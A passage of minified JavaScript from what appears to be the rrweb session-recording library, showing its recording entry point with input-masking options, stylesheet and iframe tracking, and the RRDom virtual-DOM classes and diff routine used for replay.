                adds: [],
                removes: [],
                texts: [],
                attributes: [{id: n.id, attributes: n.attributes}]
            }), this.trackLinkElement(e)
        }

        trackLinkElement(e) {
            this.trackedLinkElements.has(e) || (this.trackedLinkElements.add(e), this.trackStylesheetInLinkElement(e))
        }

        adoptStyleSheets(e, n) {
            if (e.length === 0) return;
            const r = {id: n, styleIds: []}, o = [];
            for (const a of e) {
                let s;
                if (this.styleMirror.has(a)) s = this.styleMirror.getId(a); else {
                    s = this.styleMirror.add(a);
                    const i = Array.from(a.rules || CSSRule);
                    o.push({styleId: s, rules: i.map((l, c) => ({rule: Mt(l), index: c}))})
                }
                r.styleIds.push(s)
            }
            o.length > 0 && (r.styles = o), this.adoptedStyleSheetCb(r)
        }

        reset() {
            this.styleMirror.reset(), this.trackedLinkElements = new WeakSet
        }

        trackStylesheetInLinkElement(e) {
        }
    }

    var vo = Object.defineProperty, So = Object.defineProperties, bo = Object.getOwnPropertyDescriptors,
        Sn = Object.getOwnPropertySymbols, wo = Object.prototype.hasOwnProperty,
        Eo = Object.prototype.propertyIsEnumerable,
        bn = (t, e, n) => e in t ? vo(t, e, {enumerable: !0, configurable: !0, writable: !0, value: n}) : t[e] = n,
        se = (t, e) => {
            for (var n in e || (e = {})) wo.call(e, n) && bn(t, n, e[n]);
            if (Sn) for (var n of Sn(e)) Eo.call(e, n) && bn(t, n, e[n]);
            return t
        }, No = (t, e) => So(t, bo(e));

    function G(t) {
        return No(se({}, t), {timestamp: Date.now()})
    }

    let V, Xe, mt, Ze = !1;
    const le = kt();

    function be(t = {}) {
        const {
            emit: e,
            checkoutEveryNms: n,
            checkoutEveryNth: r,
            blockClass: o = "rr-block",
            blockSelector: a = null,
            ignoreClass: s = "rr-ignore",
            maskTextClass: i = "rr-mask",
            maskTextSelector: l = null,
            inlineStylesheet: c = !0,
            maskAllInputs: u,
            maskInputOptions: d,
            slimDOMOptions: h,
            maskInputFn: p,
            maskTextFn: m,
            hooks: b,
            packFn: S,
            sampling: f = {},
            dataURLOptions: y = {},
            mousemoveWait: g,
            recordCanvas: E = !1,
            recordCrossOriginIframes: k = !1,
            userTriggeredOnInput: x = !1,
            collectFonts: F = !1,
            inlineImages: _ = !1,
            plugins: J,
            keepIframeSrcFn: Y = () => !1,
            ignoreCSSAttributes: q = new Set([])
        } = t, z = k ? window.parent === window : !0;
        let X = !1;
        if (!z) try {
            window.parent.document, X = !1
        } catch {
            X = !0
        }
        if (z && !e) throw new Error("emit function is required");
        g !== void 0 && f.mousemove === void 0 && (f.mousemove = g), le.reset();
        const $ = u === !0 ? {
            color: !0,
            date: !0,
            "datetime-local": !0,
            email: !0,
            month: !0,
            number: !0,
            range: !0,
            search: !0,
            tel: !0,
            text: !0,
            time: !0,
            url: !0,
            week: !0,
            textarea: !0,
            select: !0,
            password: !0
        } : d !== void 0 ? d : {password: !0}, Z = h === !0 || h === "all" ? {
            script: !0,
            comment: !0,
            headFavicon: !0,
            headWhitespace: !0,
            headMetaSocial: !0,
            headMetaRobots: !0,
            headMetaHttpEquiv: !0,
            headMetaVerification: !0,
            headMetaAuthorship: h === "all",
            headMetaDescKeywords: h === "all"
        } : h || {};
        at();
        let H, L = 0;
        const te = I => {
            for (const oe of J || []) oe.eventProcessor && (I = oe.eventProcessor(I));
            return S && (I = S(I)), I
        };
        V = (I, oe) => {
            var ae;
            if (((ae = Se[0]) == null ? void 0 : ae.isFrozen()) && I.type !== C.FullSnapshot && !(I.type === C.IncrementalSnapshot && I.data.source === N.Mutation) && Se.forEach(B => B.unfreeze()), z) e?.(te(I), oe); else if (X) {
                const B = {type: "rrweb", event: te(I), isCheckout: oe};
                window.parent.postMessage(B, "*")
            }
            if (I.type === C.FullSnapshot) H = I, L = 0; else if (I.type === C.IncrementalSnapshot) {
                if (I.data.source === N.Mutation && I.data.isAttachIframe) return;
                L++;
                const B = r && L >= r, ue = n && I.timestamp - H.timestamp > n;
                (B || ue) && Xe(!0)
            }
        };
        const w = I => {
                V(G({type: C.IncrementalSnapshot, data: se({source: N.Mutation}, I)}))
            }, v = I => V(G({type: C.IncrementalSnapshot, data: se({source: N.Scroll}, I)})),
            M = I => V(G({type: C.IncrementalSnapshot, data: se({source: N.CanvasMutation}, I)})),
            T = I => V(G({type: C.IncrementalSnapshot, data: se({source: N.AdoptedStyleSheet}, I)})),
            W = new go({mutationCb: w, adoptedStyleSheetCb: T}),
            ne = new Zr({mirror: le, mutationCb: w, stylesheetManager: W, recordCrossOriginIframes: k, wrappedEmit: V});
        for (const I of J || []) I.getMirror && I.getMirror({
            nodeMirror: le,
            crossOriginIframeMirror: ne.crossOriginIframeMirror,
            crossOriginIframeStyleMirror: ne.crossOriginIframeStyleMirror
        });
        mt = new yo({
            recordCanvas: E,
            mutationCb: M,
            win: window,
            blockClass: o,
            blockSelector: a,
            mirror: le,
            sampling: f.canvas,
            dataURLOptions: y
        });
        const xe = new to({
            mutationCb: w,
            scrollCb: v,
            bypassOptions: {
                blockClass: o,
                blockSelector: a,
                maskTextClass: i,
                maskTextSelector: l,
                inlineStylesheet: c,
                maskInputOptions: $,
                dataURLOptions: y,
                maskTextFn: m,
                maskInputFn: p,
                recordCanvas: E,
                inlineImages: _,
                sampling: f,
                slimDOMOptions: Z,
                iframeManager: ne,
                stylesheetManager: W,
                canvasManager: mt,
                keepIframeSrcFn: Y
            },
            mirror: le
        });
        Xe = (I = !1) => {
            var oe, ae, B, ue, A, ie;
            V(G({
                type: C.Meta,
                data: {href: window.location.href, width: ot(), height: rt()}
            }), I), W.reset(), Se.forEach(re => re.lock());
            const Ue = Sr(document, {
                mirror: le,
                blockClass: o,
                blockSelector: a,
                maskTextClass: i,
                maskTextSelector: l,
                inlineStylesheet: c,
                maskAllInputs: $,
                maskTextFn: m,
                slimDOM: Z,
                dataURLOptions: y,
                recordCanvas: E,
                inlineImages: _,
                onSerialize: re => {
                    Ie(re, le) && ne.addIframe(re), ct(re, le) && W.trackLinkElement(re), ve(re) && xe.addShadowRoot(re.shadowRoot, document)
                },
                onIframeLoad: (re, It) => {
                    ne.attachIframe(re, It), xe.observeAttachShadow(re)
                },
                onStylesheetLoad: (re, It) => {
                    W.attachLinkElement(re, It)
                },
                keepIframeSrcFn: Y
            });
            if (!Ue) return console.warn("Failed to snapshot the document");
            V(G({
                type: C.FullSnapshot,
                data: {
                    node: Ue,
                    initialOffset: {
                        left: window.pageXOffset !== void 0 ? window.pageXOffset : document?.documentElement.scrollLeft || ((ae = (oe = document?.body) == null ? void 0 : oe.parentElement) == null ? void 0 : ae.scrollLeft) || ((B = document?.body) == null ? void 0 : B.scrollLeft) || 0,
                        top: window.pageYOffset !== void 0 ? window.pageYOffset : document?.documentElement.scrollTop || ((A = (ue = document?.body) == null ? void 0 : ue.parentElement) == null ? void 0 : A.scrollTop) || ((ie = document?.body) == null ? void 0 : ie.scrollTop) || 0
                    }
                }
            })), Se.forEach(re => re.unlock()), document.adoptedStyleSheets && document.adoptedStyleSheets.length > 0 && W.adoptStyleSheets(document.adoptedStyleSheets, le.getId(document))
        };
        try {
            const I = [];
            I.push(K("DOMContentLoaded", () => {
                V(G({type: C.DomContentLoaded, data: {}}))
            }));
            const oe = B => {
                var ue;
                return Xr({
                    mutationCb: w,
                    mousemoveCb: (A, ie) => V(G({type: C.IncrementalSnapshot, data: {source: ie, positions: A}})),
                    mouseInteractionCb: A => V(G({
                        type: C.IncrementalSnapshot,
                        data: se({source: N.MouseInteraction}, A)
                    })),
                    scrollCb: v,
                    viewportResizeCb: A => V(G({type: C.IncrementalSnapshot, data: se({source: N.ViewportResize}, A)})),
                    inputCb: A => V(G({type: C.IncrementalSnapshot, data: se({source: N.Input}, A)})),
                    mediaInteractionCb: A => V(G({
                        type: C.IncrementalSnapshot,
                        data: se({source: N.MediaInteraction}, A)
                    })),
                    styleSheetRuleCb: A => V(G({type: C.IncrementalSnapshot, data: se({source: N.StyleSheetRule}, A)})),
                    styleDeclarationCb: A => V(G({
                        type: C.IncrementalSnapshot,
                        data: se({source: N.StyleDeclaration}, A)
                    })),
                    canvasMutationCb: M,
                    fontCb: A => V(G({type: C.IncrementalSnapshot, data: se({source: N.Font}, A)})),
                    selectionCb: A => {
                        V(G({type: C.IncrementalSnapshot, data: se({source: N.Selection}, A)}))
                    },
                    blockClass: o,
                    ignoreClass: s,
                    maskTextClass: i,
                    maskTextSelector: l,
                    maskInputOptions: $,
                    inlineStylesheet: c,
                    sampling: f,
                    recordCanvas: E,
                    inlineImages: _,
                    userTriggeredOnInput: x,
                    collectFonts: F,
                    doc: B,
                    maskInputFn: p,
                    maskTextFn: m,
                    keepIframeSrcFn: Y,
                    blockSelector: a,
                    slimDOMOptions: Z,
                    dataURLOptions: y,
                    mirror: le,
                    iframeManager: ne,
                    stylesheetManager: W,
                    shadowDomManager: xe,
                    canvasManager: mt,
                    ignoreCSSAttributes: q,
                    plugins: ((ue = J?.filter(A => A.observer)) == null ? void 0 : ue.map(A => ({
                        observer: A.observer,
                        options: A.options,
                        callback: ie => V(G({type: C.Plugin, data: {plugin: A.name, payload: ie}}))
                    }))) || []
                }, b)
            };
            ne.addLoadListener(B => {
                I.push(oe(B.contentDocument))
            });
            const ae = () => {
                Xe(), I.push(oe(document)), Ze = !0
            };
            return document.readyState === "interactive" || document.readyState === "complete" ? ae() : I.push(K("load", () => {
                V(G({type: C.Load, data: {}})), ae()
            }, window)), () => {
                I.forEach(B => B()), Ze = !1
            }
        } catch (I) {
            console.warn(I)
        }
    }

    be.addCustomEvent = (t, e) => {
        if (!Ze) throw new Error("please add custom event after start recording");
        V(G({type: C.Custom, data: {tag: t, payload: e}}))
    }, be.freezePage = () => {
        Se.forEach(t => t.freeze())
    }, be.takeFullSnapshot = t => {
        if (!Ze) throw new Error("please take full snapshot after start recording");
        Xe(t)
    }, be.mirror = le;
    var R;
    (function (t) {
        t[t.Document = 0] = "Document", t[t.DocumentType = 1] = "DocumentType", t[t.Element = 2] = "Element", t[t.Text = 3] = "Text", t[t.CDATA = 4] = "CDATA", t[t.Comment = 5] = "Comment"
    })(R || (R = {}));
    var Co = function () {
        function t() {
            this.idNodeMap = new Map, this.nodeMetaMap = new WeakMap
        }

        return t.prototype.getId = function (e) {
            var n;
            if (!e) return -1;
            var r = (n = this.getMeta(e)) === null || n === void 0 ? void 0 : n.id;
            return r ?? -1
        }, t.prototype.getNode = function (e) {
            return this.idNodeMap.get(e) || null
        }, t.prototype.getIds = function () {
            return Array.from(this.idNodeMap.keys())
        }, t.prototype.getMeta = function (e) {
            return this.nodeMetaMap.get(e) || null
        }, t.prototype.removeNodeFromMap = function (e) {
            var n = this, r = this.getId(e);
            this.idNodeMap.delete(r), e.childNodes && e.childNodes.forEach(function (o) {
                return n.removeNodeFromMap(o)
            })
        }, t.prototype.has = function (e) {
            return this.idNodeMap.has(e)
        }, t.prototype.hasNode = function (e) {
            return this.nodeMetaMap.has(e)
        }, t.prototype.add = function (e, n) {
            var r = n.id;
            this.idNodeMap.set(r, e), this.nodeMetaMap.set(e, n)
        }, t.prototype.replace = function (e, n) {
            var r = this.getNode(e);
            if (r) {
                var o = this.nodeMetaMap.get(r);
                o && this.nodeMetaMap.set(n, o)
            }
            this.idNodeMap.set(e, n)
        }, t.prototype.reset = function () {
            this.idNodeMap = new Map, this.nodeMetaMap = new WeakMap
        }, t
    }();

    function Io() {
        return new Co
    }

    function To(t) {
        const e = {}, n = /;(?![^(]*\))/g, r = /:(.+)/, o = /\/\*.*?\*\//g;
        return t.replace(o, "").split(n).forEach(function (a) {
            if (a) {
                const s = a.split(r);
                s.length > 1 && (e[ft(s[0].trim())] = s[1].trim())
            }
        }), e
    }

    function wn(t) {
        const e = [];
        for (const n in t) {
            const r = t[n];
            if (typeof r != "string") continue;
            const o = Ro(n);
            e.push(`${o}: ${r};`)
        }
        return e.join(" ")
    }

    const Mo = /-([a-z])/g, ko = /^--[a-zA-Z0-9-]+$/,
        ft = t => ko.test(t) ? t : t.replace(Mo, (e, n) => n ? n.toUpperCase() : ""), Do = /\B([A-Z])/g,
        Ro = t => t.replace(Do, "-$1").toLowerCase();

    class ce {
        constructor(...e) {
            this.childNodes = [], this.parentElement = null, this.parentNode = null, this.ELEMENT_NODE = U.ELEMENT_NODE, this.TEXT_NODE = U.TEXT_NODE
        }

        get firstChild() {
            return this.childNodes[0] || null
        }

        get lastChild() {
            return this.childNodes[this.childNodes.length - 1] || null
        }

        get nextSibling() {
            const e = this.parentNode;
            if (!e) return null;
            const n = e.childNodes, r = n.indexOf(this);
            return n[r + 1] || null
        }

        contains(e) {
            if (e === this) return !0;
            for (const n of this.childNodes) if (n.contains(e)) return !0;
            return !1
        }

        appendChild(e) {
            throw new Error("RRDomException: Failed to execute 'appendChild' on 'RRNode': This RRNode type does not support this method.")
        }

        insertBefore(e, n) {
            throw new Error("RRDomException: Failed to execute 'insertBefore' on 'RRNode': This RRNode type does not support this method.")
        }

        removeChild(e) {
            throw new Error("RRDomException: Failed to execute 'removeChild' on 'RRNode': This RRNode type does not support this method.")
        }

        toString() {
            return "RRNode"
        }
    }

    function xo(t) {
        return class Zn extends t {
            constructor() {
                super(...arguments), this.nodeType = U.DOCUMENT_NODE, this.nodeName = "#document", this.compatMode = "CSS1Compat", this.RRNodeType = R.Document, this.textContent = null
            }

            get documentElement() {
                return this.childNodes.find(n => n.RRNodeType === R.Element && n.tagName === "HTML") || null
            }

            get body() {
                var n;
                return ((n = this.documentElement) === null || n === void 0 ? void 0 : n.childNodes.find(r => r.RRNodeType === R.Element && r.tagName === "BODY")) || null
            }

            get head() {
                var n;
                return ((n = this.documentElement) === null || n === void 0 ? void 0 : n.childNodes.find(r => r.RRNodeType === R.Element && r.tagName === "HEAD")) || null
            }

            get implementation() {
                return this
            }

            get firstElementChild() {
                return this.documentElement
            }

            appendChild(n) {
                const r = n.RRNodeType;
                if ((r === R.Element || r === R.DocumentType) && this.childNodes.some(o => o.RRNodeType === r)) throw new Error(`RRDomException: Failed to execute 'appendChild' on 'RRNode': Only one ${r === R.Element ? "RRElement" : "RRDoctype"} on RRDocument allowed.`);
                return n.parentElement = null, n.parentNode = this, this.childNodes.push(n), n
            }

            insertBefore(n, r) {
                const o = n.RRNodeType;
                if ((o === R.Element || o === R.DocumentType) && this.childNodes.some(s => s.RRNodeType === o)) throw new Error(`RRDomException: Failed to execute 'insertBefore' on 'RRNode': Only one ${o === R.Element ? "RRElement" : "RRDoctype"} on RRDocument allowed.`);
                if (r === null) return this.appendChild(n);
                const a = this.childNodes.indexOf(r);
                if (a == -1) throw new Error("Failed to execute 'insertBefore' on 'RRNode': The RRNode before which the new node is to be inserted is not a child of this RRNode.");
                return this.childNodes.splice(a, 0, n), n.parentElement = null, n.parentNode = this, n
            }

            removeChild(n) {
                const r = this.childNodes.indexOf(n);
                if (r === -1) throw new Error("Failed to execute 'removeChild' on 'RRDocument': The RRNode to be removed is not a child of this RRNode.");
                return this.childNodes.splice(r, 1), n.parentElement = null, n.parentNode = null, n
            }

            open() {
                this.childNodes = []
            }

            close() {
            }

            write(n) {
                let r;
                if (n === '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "">' ? r = "-//W3C//DTD XHTML 1.0 Transitional//EN" : n === '<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" "">' && (r = "-//W3C//DTD HTML 4.0 Transitional//EN"), r) {
                    const o = this.createDocumentType("html", r, "");
                    this.open(), this.appendChild(o)
                }
            }

            createDocument(n, r, o) {
                return new Zn
            }

            createDocumentType(n, r, o) {
                const a = new (En(ce))(n, r, o);
                return a.ownerDocument = this, a
            }

            createElement(n) {
                const r = new (Nn(ce))(n);
                return r.ownerDocument = this, r
            }

            createElementNS(n, r) {
                return this.createElement(r)
            }

            createTextNode(n) {
                const r = new (Cn(ce))(n);
                return r.ownerDocument = this, r
            }

            createComment(n) {
                const r = new (In(ce))(n);
                return r.ownerDocument = this, r
            }

            createCDATASection(n) {
                const r = new (Tn(ce))(n);
                return r.ownerDocument = this, r
            }

            toString() {
                return "RRDocument"
            }
        }
    }

    function En(t) {
        return class extends t {
            constructor(e, n, r) {
                super(), this.nodeType = U.DOCUMENT_TYPE_NODE, this.RRNodeType = R.DocumentType, this.textContent = null, this.name = e, this.publicId = n, this.systemId = r, this.nodeName = e
            }

            toString() {
                return "RRDocumentType"
            }
        }
    }

    function Nn(t) {
        return class extends t {
            constructor(e) {
                super(), this.nodeType = U.ELEMENT_NODE, this.RRNodeType = R.Element, this.attributes = {}, this.shadowRoot = null, this.tagName = e.toUpperCase(), this.nodeName = e.toUpperCase()
            }

            get textContent() {
                let e = "";
                return this.childNodes.forEach(n => e += n.textContent), e
            }

            set textContent(e) {
                this.childNodes = [this.ownerDocument.createTextNode(e)]
            }

            get classList() {
                return new Lo(this.attributes.class, e => {
                    this.attributes.class = e
                })
            }

            get id() {
                return this.attributes.id || ""
            }

            get className() {
                return this.attributes.class || ""
            }

            get style() {
                const e = this.attributes.style ? To(this.attributes.style) : {}, n = /\B([A-Z])/g;
                return e.setProperty = (r, o, a) => {
                    if (n.test(r)) return;
                    const s = ft(r);
                    o ? e[s] = o : delete e[s], a === "important" && (e[s] += " !important"), this.attributes.style = wn(e)
                }, e.removeProperty = r => {
                    if (n.test(r)) return "";
                    const o = ft(r), a = e[o] || "";
                    return delete e[o], this.attributes.style = wn(e), a
                }, e
            }

            getAttribute(e) {
                return this.attributes[e] || null
            }

            setAttribute(e, n) {
                this.attributes[e] = n
            }

            setAttributeNS(e, n, r) {
                this.setAttribute(n, r)
            }

            removeAttribute(e) {
                delete this.attributes[e]
            }

            appendChild(e) {
                return this.childNodes.push(e), e.parentNode = this, e.parentElement = this, e
            }

            insertBefore(e, n) {
                if (n === null) return this.appendChild(e);
                const r = this.childNodes.indexOf(n);
                if (r == -1) throw new Error("Failed to execute 'insertBefore' on 'RRNode': The RRNode before which the new node is to be inserted is not a child of this RRNode.");
                return this.childNodes.splice(r, 0, e), e.parentElement = this, e.parentNode = this, e
            }

            removeChild(e) {
                const n = this.childNodes.indexOf(e);
                if (n === -1) throw new Error("Failed to execute 'removeChild' on 'RRElement': The RRNode to be removed is not a child of this RRNode.");
                return this.childNodes.splice(n, 1), e.parentElement = null, e.parentNode = null, e
            }

            attachShadow(e) {
                const n = this.ownerDocument.createElement("SHADOWROOT");
                return this.shadowRoot = n, n
            }

            dispatchEvent(e) {
                return !0
            }

            toString() {
                let e = "";
                for (const n in this.attributes) e += `${n}="${this.attributes[n]}" `;
                return `${this.tagName} ${e}`
            }
        }
    }

    function Oo(t) {
        return class extends t {
            attachShadow(e) {
                throw new Error("RRDomException: Failed to execute 'attachShadow' on 'RRElement': This RRElement does not support attachShadow")
            }

            play() {
                this.paused = !1
            }

            pause() {
                this.paused = !0
            }
        }
    }

    function Cn(t) {
        return class extends t {
            constructor(e) {
                super(), this.nodeType = U.TEXT_NODE, this.nodeName = "#text", this.RRNodeType = R.Text, this.data = e
            }

            get textContent() {
                return this.data
            }

            set textContent(e) {
                this.data = e
            }

            toString() {
                return `RRText text=${JSON.stringify(this.data)}`
            }
        }
    }

    function In(t) {
        return class extends t {
            constructor(e) {
                super(), this.nodeType = U.COMMENT_NODE, this.nodeName = "#comment", this.RRNodeType = R.Comment, this.data = e
            }

            get textContent() {
                return this.data
            }

            set textContent(e) {
                this.data = e
            }

            toString() {
                return `RRComment text=${JSON.stringify(this.data)}`
            }
        }
    }

    function Tn(t) {
        return class extends t {
            constructor(e) {
                super(), this.nodeName = "#cdata-section", this.nodeType = U.CDATA_SECTION_NODE, this.RRNodeType = R.CDATA, this.data = e
            }

            get textContent() {
                return this.data
            }

            set textContent(e) {
                this.data = e
            }

            toString() {
                return `RRCDATASection data=${JSON.stringify(this.data)}`
            }
        }
    }

    class Lo {
        constructor(e, n) {
            if (this.classes = [], this.add = (...r) => {
                for (const o of r) {
                    const a = String(o);
                    this.classes.indexOf(a) >= 0 || this.classes.push(a)
                }
                this.onChange && this.onChange(this.classes.join(" "))
            }, this.remove = (...r) => {
                this.classes = this.classes.filter(o => r.indexOf(o) === -1), this.onChange && this.onChange(this.classes.join(" "))
            }, e) {
                const r = e.trim().split(/\s+/);
                this.classes.push(...r)
            }
            this.onChange = n
        }
    }

    var U;
    (function (t) {
        t[t.PLACEHOLDER = 0] = "PLACEHOLDER", t[t.ELEMENT_NODE = 1] = "ELEMENT_NODE", t[t.ATTRIBUTE_NODE = 2] = "ATTRIBUTE_NODE", t[t.TEXT_NODE = 3] = "TEXT_NODE", t[t.CDATA_SECTION_NODE = 4] = "CDATA_SECTION_NODE", t[t.ENTITY_REFERENCE_NODE = 5] = "ENTITY_REFERENCE_NODE", t[t.ENTITY_NODE = 6] = "ENTITY_NODE", t[t.PROCESSING_INSTRUCTION_NODE = 7] = "PROCESSING_INSTRUCTION_NODE", t[t.COMMENT_NODE = 8] = "COMMENT_NODE", t[t.DOCUMENT_NODE = 9] = "DOCUMENT_NODE", t[t.DOCUMENT_TYPE_NODE = 10] = "DOCUMENT_TYPE_NODE", t[t.DOCUMENT_FRAGMENT_NODE = 11] = "DOCUMENT_FRAGMENT_NODE"
    })(U || (U = {}));
    const yt = {
        svg: "http://www.w3.org/2000/svg",
        "xlink:href": "http://www.w3.org/1999/xlink",
        xmlns: "http://www.w3.org/2000/xmlns/"
    }, Ao = {
        altglyph: "altGlyph",
        altglyphdef: "altGlyphDef",
        altglyphitem: "altGlyphItem",
        animatecolor: "animateColor",
        animatemotion: "animateMotion",
        animatetransform: "animateTransform",
        clippath: "clipPath",
        feblend: "feBlend",
        fecolormatrix: "feColorMatrix",
        fecomponenttransfer: "feComponentTransfer",
        fecomposite: "feComposite",
        feconvolvematrix: "feConvolveMatrix",
        fediffuselighting: "feDiffuseLighting",
        fedisplacementmap: "feDisplacementMap",
        fedistantlight: "feDistantLight",
        fedropshadow: "feDropShadow",
        feflood: "feFlood",
        fefunca: "feFuncA",
        fefuncb: "feFuncB",
        fefuncg: "feFuncG",
        fefuncr: "feFuncR",
        fegaussianblur: "feGaussianBlur",
        feimage: "feImage",
        femerge: "feMerge",
        femergenode: "feMergeNode",
        femorphology: "feMorphology",
        feoffset: "feOffset",
        fepointlight: "fePointLight",
        fespecularlighting: "feSpecularLighting",
        fespotlight: "feSpotLight",
        fetile: "feTile",
        feturbulence: "feTurbulence",
        foreignobject: "foreignObject",
        glyphref: "glyphRef",
        lineargradient: "linearGradient",
        radialgradient: "radialGradient"
    };

    function de(t, e, n, r) {
        const o = t.childNodes, a = e.childNodes;
        r = r || e.mirror || e.ownerDocument.mirror, (o.length > 0 || a.length > 0) && Mn(Array.from(o), a, t, n, r);
        let s = null, i = null;
        switch (e.RRNodeType) {
            case R.Document: {
                i = e.scrollData;
                break
            }
            case R.Element: {
                const l = t, c = e;
                switch (_o(l, c, r), i = c.scrollData, s = c.inputData, c.tagName) {
                    case"AUDIO":
                    case"VIDEO": {
                        const u = t, d = c;
                        d.paused !== void 0 && (d.paused ? u.pause() : u.play()), d.muted !== void 0 && (u.muted = d.muted), d.volume !== void 0 && (u.volume = d.volume), d.currentTime !== void 0 && (u.currentTime = d.currentTime), d.playbackRate !== void 0 && (u.playbackRate = d.playbackRate);
                        break
                    }
                    case"CANVAS": {
                        const u = e;
                        if (u.rr_dataURL !== null) {
                            const d = document.createElement("img");
                            d.onload = () => {
                                const h = l.getContext("2d");
                                h && h.drawImage(d, 0, 0, d.width, d.height)
                            }, d.src = u.rr_dataURL
                        }
                        u.canvasMutations.forEach(d => n.applyCanvas(d.event, d.mutation, t))
                    }
                        break;
                    case"STYLE": {
                        const u = l.sheet;
                        u && e.rules.forEach(d => n.applyStyleSheetMutation(d, u))
                    }
                        break
                }
                if (c.shadowRoot) {
                    l.shadowRoot || l.attachShadow({mode: "open"});
                    const u = l.shadowRoot.childNodes, d = c.shadowRoot.childNodes;
                    (u.length > 0 || d.length > 0) && Mn(Array.from(u), d, l.shadowRoot, n, r)
                }
                break
            }
            case R.Text:
            case R.Comment:
            case R.CDATA:
                t.textContent !== e.data && (t.textContent = e.data);
                break
        }
        if (i && n.applyScroll(i, !0), s && n.applyInput(s), e.nodeName === "IFRAME") {
            const l = t.contentDocument, c = e;
            if (l) {
                const u = r.getMeta(c.contentDocument);
                u && n.mirror.add(l, Object.assign({}, u)), de(l, c.contentDocument, n, r)
            }
        }
    }

    function _o(t, e, n) {
        const r = t.attributes, o = e.attributes;
        for (const a in o) {
            const s = o[a], i = n.getMeta(e);
            if (i && "isSVG" in i && i.isSVG && yt[a]) t.setAttributeNS(yt[a], a, s); else if (e.tagName === "CANVAS" && a === "rr_dataURL") {
                const l = document.createElement("img");
                l.src = s, l.onload = () => {
                    const c = t.getContext("2d");
                    c && c.drawImage(l, 0, 0, l.width, l.height)
                }
            } else t.setAttribute(a, s)
        }
        for (const {name: a} of Array.from(r)) a in o || t.removeAttribute(a);
        e.scrollLeft && (t.scrollLeft = e.scrollLeft), e.scrollTop && (t.scrollTop = e.scrollTop)
    }

    function Mn(t, e, n, r, o) {
        var a;
        let s = 0, i = t.length - 1, l = 0, c = e.length - 1, u = t[s], d = t[i], h = e[l], p = e[c], m, b;
        for (; s <= i && l <= c;) {
            const S = r.mirror.getId(u), f = r.mirror.getId(d), y = o.getId(h), g = o.getId(p);
            if (u === void 0) u = t[++s]; else if (d === void 0) d = t[--i]; else if (S !== -1 && S === y) de(u, h, r, o), u = t[++s], h = e[++l]; else if (f !== -1 && f === g) de(d, p, r, o), d = t[--i], p = e[--c]; else if (S !== -1 && S === g) n.insertBefore(u, d.nextSibling), de(u, p, r, o), u = t[++s], p = e[--c]; else if (f !== -1 && f === y) n.insertBefore(d, u), de(d, h, r, o), d = t[--i], h = e[++l]; else {
                if (!m) {
                    m = {};
                    for (let E = s; E <= i; E++) {
                        const k = t[E];
                        k && r.mirror.hasNode(k) && (m[r.mirror.getId(k)] = E)
                    }
                }
                if (b = m[o.getId(h)], b) {
                    const E = t[b];
                    n.insertBefore(E, u), de(E, h, r, o), t[b] = void 0
                } else {
                    const E = gt(h, r.mirror, o);
                    n.nodeName === "#document" && ((a = r.mirror.getMeta(E)) === null || a === void 0 ? void 0 : a.type) === R.Element && n.documentElement && (n.removeChild(n.documentElement), t[s] = void 0, u = void 0), n.insertBefore(E, u || null), de(E, h, r, o)
                }
                h = e[++l]
            }
        }
        if (s > i) {
            const S = e[c + 1];
            let f = null;
            for (S && n.childNodes.forEach(y => {
                r.mirror.getId(y) === o.getId(S) && (f = y)
            }); l <= c; ++l) {
                const y = gt(e[l], r.mirror, o);
                n.insertBefore(y, f), de(y, e[l], r, o)
            }
        } else if (l > c) for (; s <= i; s++) {
            const S = t[s];
            S && (n.removeChild(S), r.mirror.removeNodeFromMap(S))
        }
    }

    function gt(t, e, n) {
        const r = n.getId(t), o = n.getMeta(t);
        let a = null;
        if (r > -1 && (a = e.getNode(r)), a !== null) return a;
        switch (t.RRNodeType) {
            case R.Document:
                a = new Document;
                break;
            case R.DocumentType:
                a = document.implementation.createDocumentType(t.name, t.publicId, t.systemId);
                break;
            case R.Element: {
                let s = t.tagName.toLowerCase();
                s = Ao[s] || s, o && "isSVG" in o && o?.isSVG ? a = document.createElementNS(yt.svg, s) : a = document.createElement(t.tagName);
                break
            }
            case R.Text:
                a = document.createTextNode(t.data);
                break;
            case R.Comment:
                a = document.createComment(t.data);
                break;
            case R.CDATA:
                a = document.createCDATASection(t.data);
                break
        }
        return o && e.add(a, Object.assign({}, o)), a
    }

    class ke extends xo(ce) {
        constructor(e) {
            super(), this.UNSERIALIZED_STARTING_ID = -2, this._unserializedId = this.UNSERIALIZED_STARTING_ID, this.mirror = Ho(), this.scrollData = null, e && (this.mirror = e)
        }

        get unserializedId() {
            return this._unserializedId--
        }

        createDocument(e, n, r) {
            return new ke
        }

        createDocumentType(e, n, r) {
            const o = new Fo(e, n, r);
            return o.ownerDocument = this, o
        }

        createElement(e) {
            const n = e.toUpperCase();
            let r;
            switch (n) {
                case"AUDIO":
                case"VIDEO":
                    r = new Po(n);
                    break;
                case"IFRAME":
                    r = new Uo(n, this.mirror);
                    break;
                case"CANVAS":
                    r = new Wo(n);
                    break;
                case"STYLE":
                    r = new $o(n);
                    break;
                default:
                    r = new $e(n);
                    break
            }
            return r.ownerDocument = this, r
        }

        createComment(e) {
            const n = new Bo(e);
            return n.ownerDocument = this, n
        }

        createCDATASection(e) {
            const n = new Go(e);
            return n.ownerDocument = this, n
        }

        createTextNode(e) {
            const n = new Vo(e);
            return n.ownerDocument = this, n
        }

        destroyTree() {
            this.childNodes = [], this.mirror.reset()
        }

        open() {
            super.open(), this._unserializedId = this.UNSERIALIZED_STARTING_ID
        }
    }

    const Fo = En(ce);

    class $e extends Nn(ce) {
        constructor() {
            super(...arguments), this.inputData = null, this.scrollData = null
        }
    }

    class Po extends Oo($e) {
    }

    class Wo extends $e {
        constructor() {
            super(...arguments), this.rr_dataURL = null, this.canvasMutations = []
        }

        getContext() {
            return null
        }
    }

    class $o extends $e {
        constructor() {
            super(...arguments), this.rules = []
        }
    }

    class Uo extends $e {
        constructor(e, n) {
            super(e), this.contentDocument = new ke, this.contentDocument.mirror = n
        }
    }

    const Vo = Cn(ce), Bo = In(ce), Go = Tn(ce);

    function jo(t) {
        return t instanceof HTMLFormElement ? "FORM" : t.tagName.toUpperCase()
    }

    function kn(t, e, n, r) {
        let o;
        switch (t.nodeType) {
            case U.DOCUMENT_NODE:
                r && r.nodeName === "IFRAME" ? o = r.contentDocument : (o = e, o.compatMode = t.compatMode);
                break;
            case U.DOCUMENT_TYPE_NODE: {
                const s = t;
                o = e.createDocumentType(s.name, s.publicId, s.systemId);
                break
            }
